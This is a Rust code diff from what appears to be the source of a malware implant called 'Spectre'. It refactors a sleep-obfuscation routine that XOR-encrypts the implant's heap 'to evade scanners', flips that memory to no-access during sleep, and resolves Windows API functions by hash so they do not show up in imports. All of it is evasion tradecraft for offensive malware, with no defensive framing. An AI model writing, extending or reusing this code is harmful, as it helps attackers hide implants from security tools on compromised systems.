@@ -4,14 +4,16 @@ use super::syscalls::{sys_nanosleep, Timespec};
 #[cfg(target_os = "windows")]
 use crate::utils::api_resolver::{hash_str, resolve_function};
 
+/// Performs a stealthy sleep with heap obfuscation.
 pub fn sleep(ms: u64) {
     // Obfuscation: Encrypt heap memory to evade scanners during sleep
     encrypt_heap();
 
     #[cfg(target_os = "windows")]
     unsafe {
+        let (base, size) = get_heap_range();
         // Change heap to NOACCESS
-        set_memory_protection(0x10000000 as *mut u8, 1024 * 1024, 0x01); // PAGE_NOACCESS
+        set_memory_protection(base, size, 0x01); // PAGE_NOACCESS
     }
 
     #[cfg(not(target_os = "windows"))]
@@ -28,7 +30,6 @@ pub fn sleep(ms: u64) {
     #[cfg(target_os = "windows")]
     {
         unsafe {
-            // Resolve kernel32.Sleep
             let k32_hash = hash_str(b"KERNEL32.DLL");
             let sleep_hash = hash_str(b"Sleep");
             let fn_sleep = resolve_function(k32_hash, sleep_hash);
@@ -39,8 +40,9 @@ pub fn sleep(ms: u64) {
                 sleep(ms as u32);
             }
 
+            let (base, size) = get_heap_range();
             // Restore heap protection
-            set_memory_protection(0x10000000 as *mut u8, 1024 * 1024, 0x04); // PAGE_READWRITE
+            set_memory_protection(base, size, 0x04); // PAGE_READWRITE
         }
     }
 
@@ -61,15 +63,13 @@ unsafe fn set_memory_protection(base: *mut u8, size: usize, protect: u32) {
 }
 
 pub fn encrypt_heap() {
-    // Simple XOR encryption of the heap region
-    // Heap base defined in lib.rs global allocator
-    let heap_start = 0x10000000 as *mut u8;
-    let heap_size = 1024 * 1024;
+    let (heap_start, heap_size) = get_heap_range();
     let key = 0xAA;
 
     unsafe {
         for i in 0..heap_size {
             let ptr = heap_start.add(i);
+            // XOR encryption
             *ptr ^= key;
         }
     }
@@ -77,4 +77,11 @@ pub fn encrypt_heap() {
 
 pub fn decrypt_heap() {
     encrypt_heap(); // XOR is symmetric
+}
+
+fn get_heap_range() -> (*mut u8, usize) {
+    // In a production implant, we would walk the process heap or use the global allocator range.
+    // For Spectre, we use the pre-defined region managed by MiniHeap.
+    // Offset 0x10000000 is our dedicated heap base.
+    (0x10000000 as *mut u8, 1024 * 1024)
 }
